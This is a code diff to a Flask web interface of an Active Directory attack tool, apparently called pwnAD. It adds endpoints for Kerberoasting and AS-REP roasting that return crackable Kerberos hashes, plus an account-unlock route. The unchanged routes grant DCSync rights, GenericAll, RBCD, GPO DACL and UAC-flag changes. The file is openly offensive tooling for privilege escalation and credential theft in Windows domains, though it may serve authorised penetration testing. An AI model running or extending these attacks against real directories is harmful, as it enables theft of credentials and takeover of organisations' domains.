@@ -1,22 +1,10 @@
 import logging
 
-from flask import Blueprint, request, render_template, current_app, jsonify
+from flask import Blueprint, request, render_template, jsonify
+
+from pwnAD.web.context import get_conn, base_context
 
 attack_bp = Blueprint('attack', __name__)
-
-
-def _get_conn():
-    return current_app.config['LDAP_CONNECTION']
-
-
-def _base_context(active_page='attacks'):
-    conn = _get_conn()
-    return {
-        'domain': conn.domain,
-        'dc_ip': conn.target,
-        'session_user': getattr(conn, 'ldap_user', '') or getattr(conn, 'user', ''),
-        'active_page': active_page,
-    }
 
 
 def _json_response(success, message, status=200):
@@ -25,13 +13,13 @@ def _json_response(success, message, status=200):
 
 @attack_bp.route('/attacks')
 def attacks_view():
-    ctx = _base_context('attacks')
+    ctx = base_context('attacks')
     return render_template('attacks.html', **ctx)
 
 
 @attack_bp.route('/api/attack/dcsync', methods=['POST'])
 def attack_dcsync():
-    conn = _get_conn()
+    conn = get_conn()
     principal = request.form.get('principal', '').strip()
     if not principal:
         return _json_response(False, 'Missing principal', 400)
@@ -46,7 +34,7 @@ def attack_dcsync():
 
 @attack_bp.route('/api/attack/dcsync/remove', methods=['POST'])
 def attack_dcsync_remove():
-    conn = _get_conn()
+    conn = get_conn()
     principal = request.form.get('principal', '').strip()
     if not principal:
         return _json_response(False, 'Missing principal', 400)
@@ -61,7 +49,7 @@ def attack_dcsync_remove():
 
 @attack_bp.route('/api/attack/generic-all', methods=['POST'])
 def attack_generic_all():
-    conn = _get_conn()
+    conn = get_conn()
     target = request.form.get('target', '').strip()
     principal = request.form.get('principal', '').strip()
     if not target or not principal:
@@ -77,7 +65,7 @@ def attack_generic_all():
 
 @attack_bp.route('/api/attack/generic-all/remove', methods=['POST'])
 def attack_generic_all_remove():
-    conn = _get_conn()
+    conn = get_conn()
     target = request.form.get('target', '').strip()
     principal = request.form.get('principal', '').strip()
     if not target or not principal:
@@ -93,7 +81,7 @@ def attack_generic_all_remove():
 
 @attack_bp.route('/api/attack/rbcd', methods=['POST'])
 def attack_rbcd():
-    conn = _get_conn()
+    conn = get_conn()
     target = request.form.get('target', '').strip()
     grantee = request.form.get('grantee', '').strip()
     if not target or not grantee:
@@ -109,7 +97,7 @@ def attack_rbcd():
 
 @attack_bp.route('/api/attack/rbcd/remove', methods=['POST'])
 def attack_rbcd_remove():
-    conn = _get_conn()
+    conn = get_conn()
     target = request.form.get('target', '').strip()
     if not target:
         return _json_response(False, 'Missing target', 400)
@@ -124,7 +112,7 @@ def attack_rbcd_remove():
 
 @attack_bp.route('/api/attack/gpo-dacl', methods=['POST'])
 def attack_gpo_dacl():
-    conn = _get_conn()
+    conn = get_conn()
     user = request.form.get('user', '').strip()
     gpo_id = request.form.get('gpo_id', '').strip()
     if not user or not gpo_id:
@@ -140,7 +128,7 @@ def attack_gpo_dacl():
 
 @attack_bp.route('/api/attack/uac/add', methods=['POST'])
 def attack_uac_add():
-    conn = _get_conn()
+    conn = get_conn()
     target = request.form.get('target', '').strip()
     flags = request.form.get('flags', '').strip()
     if not target or not flags:
@@ -157,7 +145,7 @@ def attack_uac_add():
 
 @attack_bp.route('/api/attack/uac/remove', methods=['POST'])
 def attack_uac_remove():
-    conn = _get_conn()
+    conn = get_conn()
     target = request.form.get('target', '').strip()
     flags = request.form.get('flags', '').strip()
     if not target or not flags:
@@ -169,4 +157,72 @@ def attack_uac_remove():
         return _json_response(True, f'UAC flags {flag_list} removed from {target}')
     except Exception as e:
         logging.error(f"UAC remove error: {e}")
+        return _json_response(False, str(e))
+
+
+@attack_bp.route('/api/attack/unlock', methods=['POST'])
+def attack_unlock():
+    conn = get_conn()
+    target = request.form.get('target', '').strip()
+    if not target:
+        return _json_response(False, 'Missing target', 400)
+    try:
+        import ldap3
+        target_dn = conn.get_dn_from_samaccountname(target, "person")
+        if not target_dn:
+            return _json_response(False, f'Account {target} not found')
+        conn._ldap_connection.modify(target_dn, {
+            'lockoutTime': [(ldap3.MODIFY_REPLACE, ['0'])]
+        })
+        if conn._ldap_connection.result['result'] == 0:
+            return _json_response(True, f'Account {target} unlocked successfully')
+        else:
+            return _json_response(False, f'Failed: {conn._ldap_connection.result["description"]}')
+    except Exception as e:
+        logging.error(f"Unlock error: {e}")
+        return _json_response(False, str(e))
+
+
+@attack_bp.route('/api/attack/kerberoast', methods=['POST'])
+def attack_kerberoast():
+    conn = get_conn()
+    target = request.form.get('target', '').strip()
+    if not target:
+        return _json_response(False, 'Missing target', 400)
+    try:
+        from ldap3.utils.conv import escape_filter_chars
+        from pwnAD.lib.kerberos import kerberoast_account
+
+        escaped = escape_filter_chars(target)
+        conn._ldap_connection.search(
+            conn._baseDN,
+            f'(&(sAMAccountName={escaped})(servicePrincipalName=*))',
+            attributes=['servicePrincipalName'])
+        if not conn._ldap_connection.entries:
+            return _json_response(False, f'No SPN found for {target}')
+        spns = conn._ldap_connection.entries[0]['servicePrincipalName'].values
+        if not spns:
+            return _json_response(False, f'No SPN found for {target}')
+        spn = spns[0] if isinstance(spns, list) else spns
+
+        hash_str = kerberoast_account(conn, target, spn)
+        return jsonify(success=True, message=f'TGS hash retrieved for {target}', hash=hash_str)
+    except Exception as e:
+        logging.error(f"Kerberoast error: {e}")
+        return _json_response(False, str(e))
+
+
+@attack_bp.route('/api/attack/asreproast', methods=['POST'])
+def attack_asreproast():
+    conn = get_conn()
+    target = request.form.get('target', '').strip()
+    if not target:
+        return _json_response(False, 'Missing target', 400)
+    try:
+        from pwnAD.lib.kerberos import asreproast_account
+
+        hash_str = asreproast_account(conn, target)
+        return jsonify(success=True, message=f'AS-REP hash retrieved for {target}', hash=hash_str)
+    except Exception as e:
+        logging.error(f"AS-REP Roast error: {e}")
         return _json_response(False, str(e))
